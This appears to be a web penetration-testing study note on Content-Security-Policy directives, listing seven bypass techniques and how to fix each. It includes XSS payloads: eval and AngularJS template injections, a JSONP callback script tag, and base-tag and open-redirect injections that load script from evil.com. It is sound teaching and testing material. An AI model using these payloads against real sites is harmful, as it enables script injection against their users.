---
tags: [vapt, http-headers, web, advanced]
difficulty: advanced
module: "03 - HTTP Headers"
topic: "03.34 Content-Security-Policy (CSP) — Directives, Bypasses"
portswigger_labs: ["XSS Expert labs — CSP bypass"]
---

# 03.34 — Content-Security-Policy (CSP)

## What is it?

CSP is a browser security mechanism that restricts which resources (scripts, images, styles, etc.) a page can load. It's the primary defense against XSS. A strong CSP prevents execution of injected scripts even when XSS exists. A weak CSP can be bypassed.

---

## CSP Directives Reference

```
Content-Security-Policy: <directive> <source-list>; <directive> <source-list>

KEY DIRECTIVES:
  default-src   → fallback for all resource types
  script-src    → controls JavaScript sources
  style-src     → CSS sources
  img-src       → image sources
  connect-src   → fetch/XHR/WebSocket destinations
  font-src      → font sources
  frame-src     → iframe sources
  form-action   → where forms can submit
  frame-ancestors → who can embed this page (clickjacking!)
  base-uri      → restricts <base> tag (prevents base tag hijacking)
  object-src    → Flash/plugin objects (should be 'none')
  report-uri    → where to send violation reports
  report-to     → modern version of report-uri

SOURCE VALUES:
  'none'        → block everything
  'self'        → same origin
  'unsafe-inline' → allows inline scripts (UNSAFE!)
  'unsafe-eval' → allows eval() (UNSAFE!)
  'nonce-abc'   → allows specific inline scripts with this nonce
  'sha256-xxx'  → allows specific script by hash
  https://cdn.example.com → specific origin
  *.example.com → wildcard subdomain (dangerous!)
```

---

## CSP Bypass 1: Unsafe-Inline

```
CSP: script-src 'self' 'unsafe-inline'

'unsafe-inline' defeats entire purpose of CSP!
All XSS payloads work: <script>alert(1)</script>

Check for it: curl -sI https://target.com | grep "script-src"
```

---

## CSP Bypass 2: Unsafe-Eval

```
CSP: script-src 'self' 'unsafe-eval'

Allows: eval(), setTimeout("code"), setInterval("code"), new Function()

BYPASS:
  <img onerror="eval('alert\x281\x29')" src=x>
  
  AngularJS template injection if Angular is loaded:
  {{constructor.constructor('alert(1)')()}}
```

---

## CSP Bypass 3: Whitelisted CDN with JSONP

```
CSP: script-src 'self' https://cdn.trusted.com

If cdn.trusted.com has a JSONP endpoint:
  <script src="https://cdn.trusted.com/api?callback=alert(1)//"></script>
  → Executes alert(1) in target context!
  
COMMON BYPASSES:
  - Google Analytics: cdn.google.com has JSONP
  - APIs with callback parameter
  - Angular CDN: allows Angular CSP bypass!
```

**PortSwigger:** CSP bypass labs

---

## CSP Bypass 4: AngularJS Sandbox Escape

```
CSP: script-src 'self' https://ajax.googleapis.com/ajax/libs/angularjs/

If AngularJS (old versions) is loaded:
  {{$on.constructor('alert(1)')()}}
  
  AngularJS template expressions evaluate to JavaScript!
  Works even with no 'unsafe-inline' in CSP!
  
  (Angular 2+ doesn't have this issue)
```

---

## CSP Bypass 5: base-uri Missing

```
CSP: script-src 'self'    (no base-uri directive!)

ATTACK:
  Inject: <base href="https://evil.com/">
  
  All relative script paths now load from evil.com!
  <script src="/app.js"> → https://evil.com/app.js!
  
FIX: Add base-uri 'self' or base-uri 'none' to CSP!
```

---

## CSP Bypass 6: Open Redirect + Whitelisted Origin

```
CSP: script-src 'self' https://trusted.com

If trusted.com has an open redirect:
  <script src="https://trusted.com/redirect?url=https://evil.com/xss.js"></script>
  
  Browser sees trusted.com → allowed by CSP
  Redirect goes to evil.com/xss.js → executes attacker's code!
```

---

## CSP Bypass 7: Nonce Reuse / Leakage

```
Strong CSP uses nonces:
  script-src 'nonce-randomNonce123'
  
  <script nonce="randomNonce123">legitimate code</script>
  
ATTACK:
  1. If nonce is predictable → forge it!
  2. If nonce is in URL/referrer → leaked via Referer header!
  3. If page has HTML injection (not XSS) → inject <script nonce="stolenNonce">!
```

---

## Testing CSP

```bash
# Check CSP header
curl -sI https://target.com | grep -i "content-security-policy"

# Analyze CSP strength online:
# https://csp-evaluator.withgoogle.com/

# Check for dangerous values:
curl -sI https://target.com | grep -i csp | grep -E "'unsafe-inline'|'unsafe-eval'|\*"

# Burp Suite → Target → Site Map → right-click → Engagement Tools → Analyze CSP
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| `unsafe-inline` | Use nonces or hashes instead |
| `unsafe-eval` | Refactor code to not use eval |
| Wildcard/JSONP source | Use specific origins; check for JSONP on whitelisted domains |
| Missing base-uri | Add `base-uri 'self'` |
| Missing object-src | Add `object-src 'none'` |
| Predictable nonces | Generate cryptographically random nonce per response |

---

## Related Notes
- [[Module 02 - XSS]] — XSS attacks CSP protects against
- [[35 - X-Content-Type-Options]] — other XSS-related header
- [[36 - X-Frame-Options]] — frame-ancestors directive alternative
- [[Module 19 - CSP Bypass]] — full CSP bypass techniques
